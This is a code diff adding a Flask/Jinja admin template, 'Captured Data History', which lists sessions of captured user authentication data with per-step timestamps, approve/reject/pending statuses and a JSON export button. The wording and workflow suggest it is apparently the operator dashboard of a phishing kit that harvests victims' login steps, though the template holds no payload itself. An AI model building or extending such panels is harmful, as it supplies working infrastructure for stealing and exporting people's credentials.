@@ -1,0 +1,342 @@
+{% extends "base.html" %}
+
+{% block title %}Data History - Admin{% endblock %}
+
+{% block extra_css %}
+<style>
+  .history-container {
+    max-width: 1200px;
+    margin: 20px auto;
+    padding: 0 20px;
+  }
+
+  .history-header {
+    background: var(--primary);
+    color: #fff;
+    padding: 20px;
+    border-radius: 8px;
+    margin-bottom: 20px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+
+  .history-header h1 {
+    margin: 0;
+    font-size: 24px;
+  }
+
+  .back-btn {
+    background: rgba(255,255,255,0.2);
+    color: #fff;
+    border: 1px solid rgba(255,255,255,0.3);
+    padding: 8px 16px;
+    border-radius: 4px;
+    text-decoration: none;
+    font-size: 14px;
+  }
+
+  .back-btn:hover {
+    background: rgba(255,255,255,0.3);
+  }
+
+  .sessions-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
+    gap: 20px;
+  }
+
+  .session-card {
+    background: #fff;
+    border-radius: 8px;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+    padding: 20px;
+    border: 1px solid #e9ecef;
+  }
+
+  .session-header {
+    display: flex;
+    justify-content: between;
+    align-items: flex-start;
+    margin-bottom: 15px;
+  }
+
+  .session-id {
+    font-family: monospace;
+    font-size: 12px;
+    color: var(--primary);
+    font-weight: bold;
+    background: #f8f9fa;
+    padding: 4px 8px;
+    border-radius: 4px;
+  }
+
+  .session-time {
+    color: var(--text-light);
+    font-size: 12px;
+  }
+
+  .session-status {
+    margin-bottom: 15px;
+  }
+
+  .status-badge {
+    display: inline-block;
+    padding: 4px 8px;
+    border-radius: 12px;
+    font-size: 12px;
+    font-weight: bold;
+    text-transform: uppercase;
+  }
+
+  .status-approved {
+    background: #d4edda;
+    color: #155724;
+  }
+
+  .status-rejected {
+    background: #f8d7da;
+    color: #721c24;
+  }
+
+  .status-pending {
+    background: #fff3cd;
+    color: #856404;
+  }
+
+  .session-steps {
+    margin-bottom: 15px;
+  }
+
+  .step-count {
+    color: var(--text-light);
+    font-size: 14px;
+  }
+
+  .steps-list {
+    margin-top: 10px;
+  }
+
+  .step-item {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 8px 12px;
+    background: #f8f9fa;
+    border-radius: 4px;
+    margin-bottom: 5px;
+    font-size: 12px;
+  }
+
+  .step-name {
+    color: var(--text-dark);
+    font-weight: 500;
+  }
+
+  .step-time {
+    color: var(--text-light);
+  }
+
+  .session-actions {
+    display: flex;
+    gap: 10px;
+  }
+
+  .view-btn {
+    flex: 1;
+    background: var(--primary);
+    color: #fff;
+    border: none;
+    padding: 8px 12px;
+    border-radius: 4px;
+    cursor: pointer;
+    font-size: 12px;
+    text-decoration: none;
+    text-align: center;
+  }
+
+  .view-btn:hover {
+    background: #6c2c3a;
+  }
+
+  .export-btn {
+    background: var(--accent);
+    color: #fff;
+    border: none;
+    padding: 8px 12px;
+    border-radius: 4px;
+    cursor: pointer;
+    font-size: 12px;
+  }
+
+  .export-btn:hover {
+    background: #e55b00;
+  }
+
+  .no-sessions {
+    text-align: center;
+    padding: 60px 20px;
+    color: var(--text-light);
+    background: #fff;
+    border-radius: 8px;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+  }
+
+  .filter-controls {
+    background: #fff;
+    padding: 20px;
+    border-radius: 8px;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+    margin-bottom: 20px;
+    display: flex;
+    gap: 15px;
+    align-items: center;
+    flex-wrap: wrap;
+  }
+
+  .filter-controls select,
+  .filter-controls input {
+    padding: 8px 12px;
+    border: 1px solid #dee2e6;
+    border-radius: 4px;
+    font-size: 14px;
+  }
+
+  .filter-label {
+    font-weight: 500;
+    color: var(--text-dark);
+  }
+</style>
+{% endblock %}
+
+{% block content %}
+<div class="history-container">
+  <div class="history-header">
+    <h1>Captured Data History</h1>
+    <a href="{{ url_for('admin_dashboard') }}" class="back-btn">← Back to Dashboard</a>
+  </div>
+
+  <div class="filter-controls">
+    <span class="filter-label">Filter by:</span>
+    <select id="statusFilter" onchange="filterSessions()">
+      <option value="">All Status</option>
+      <option value="approved">Approved</option>
+      <option value="rejected">Rejected</option>
+      <option value="pending">Pending</option>
+    </select>
+    
+    <span class="filter-label">Date:</span>
+    <input type="date" id="dateFilter" onchange="filterSessions()">
+    
+    <button onclick="clearFilters()" class="export-btn">Clear Filters</button>
+  </div>
+
+  {% if captured_data %}
+  <div class="sessions-grid" id="sessionsGrid">
+    {% for session_id, session_data in captured_data.items() %}
+    <div class="session-card" 
+         data-status="{% if session_data.approved_at %}approved{% elif session_data.rejected_at %}rejected{% else %}pending{% endif %}"
+         data-date="{{ session_data.session_start.strftime('%Y-%m-%d') if session_data.session_start else '' }}">
+      
+      <div class="session-header">
+        <div>
+          <div class="session-id">{{ session_id[:12] }}...</div>
+          <div class="session-time">
+            Started: {{ session_data.session_start.strftime('%Y-%m-%d %H:%M:%S') if session_data.session_start else 'Unknown' }}
+          </div>
+        </div>
+      </div>
+
+      <div class="session-status">
+        {% if session_data.approved_at %}
+          <span class="status-badge status-approved">Approved</span>
+          <div class="session-time">{{ session_data.approved_at.strftime('%Y-%m-%d %H:%M:%S') }} by {{ session_data.approved_by or 'admin' }}</div>
+        {% elif session_data.rejected_at %}
+          <span class="status-badge status-rejected">Rejected</span>
+          <div class="session-time">{{ session_data.rejected_at.strftime('%Y-%m-%d %H:%M:%S') }} by {{ session_data.rejected_by or 'admin' }}</div>
+        {% else %}
+          <span class="status-badge status-pending">Pending</span>
+        {% endif %}
+      </div>
+
+      {% if session_data.steps %}
+      <div class="session-steps">
+        <div class="step-count">{{ session_data.steps|length }} authentication steps</div>
+        <div class="steps-list">
+          {% for step_name, step_data in session_data.steps.items() %}
+          <div class="step-item">
+            <span class="step-name">{{ step_name }}</span>
+            <span class="step-time">{{ step_data.timestamp.strftime('%H:%M:%S') }}</span>
+          </div>
+          {% endfor %}
+        </div>
+      </div>
+      {% endif %}
+
+      <div class="session-actions">
+        <a href="{{ url_for('admin_view_data', session_id=session_id) }}" class="view-btn">View Details</a>
+        <button onclick="exportSessionData('{{ session_id }}')" class="export-btn">Export</button>
+      </div>
+    </div>
+    {% endfor %}
+  </div>
+  {% else %}
+  <div class="no-sessions">
+    <h3>No Data Available</h3>
+    <p>No user authentication data has been captured yet.</p>
+  </div>
+  {% endif %}
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+  function exportSessionData(sessionId) {
+    fetch('/admin/export-data/' + sessionId)
+      .then(response => response.json())
+      .then(data => {
+        const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = 'session_' + sessionId.substring(0, 8) + '_data.json';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+      })
+      .catch(error => {
+        console.error('Error exporting data:', error);
+        alert('Error exporting data');
+      });
+  }
+
+  function filterSessions() {
+    const statusFilter = document.getElementById('statusFilter').value;
+    const dateFilter = document.getElementById('dateFilter').value;
+    const sessionCards = document.querySelectorAll('.session-card');
+
+    sessionCards.forEach(card => {
+      let showCard = true;
+
+      // Filter by status
+      if (statusFilter && card.dataset.status !== statusFilter) {
+        showCard = false;
+      }
+
+      // Filter by date
+      if (dateFilter && card.dataset.date !== dateFilter) {
+        showCard = false;
+      }
+
+      card.style.display = showCard ? 'block' : 'none';
+    });
+  }
+
+  function clearFilters() {
+    document.getElementById('statusFilter').value = '';
+    document.getElementById('dateFilter').value = '';
+    filterSessions();
+  }
+</script>
+{% endblock %}
